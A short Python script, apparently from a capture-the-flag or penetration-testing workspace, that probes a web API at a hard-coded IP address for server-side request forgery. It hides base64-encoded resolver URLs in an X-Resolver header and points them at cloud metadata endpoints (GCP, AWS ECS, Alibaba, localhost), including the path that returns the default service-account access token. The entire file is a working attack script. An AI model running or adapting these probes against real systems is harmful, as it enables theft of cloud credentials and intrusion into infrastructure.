"""Do resolver voi cac metadata endpoint (link-local va ten host noi bo cua may chu).

Chay: python analysis/metadata_probe.py
"""

import base64
import json
import urllib.error
import urllib.request

BASE = "http://34.116.80.78:9143"


def temp(resolver, ship="Cassini"):
    hdr = "X" + base64.b64encode(json.dumps({"resolver": resolver}).encode()).decode()
    req = urllib.request.Request(f"{BASE}/api/v1/ship/{ship}/temperature", headers={"X-Resolver": hdr})
    try:
        with urllib.request.urlopen(req, timeout=50) as r:
            return f"HTTP{r.status} body={r.read().decode().strip()!r}"
    except urllib.error.HTTPError as e:
        return f"HTTP{e.code} body={e.read().decode().strip()[:30]!r}"
    except Exception as e:
        return f"err {type(e).__name__}"


CASES = [
    "http://169.254.169.254/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.170.2/v1/id",
    "http://[::1]/",
    "http://100.100.100.200/latest/meta-data/",
]

for u in CASES:
    print(f"{u:70}: {temp(u)}")
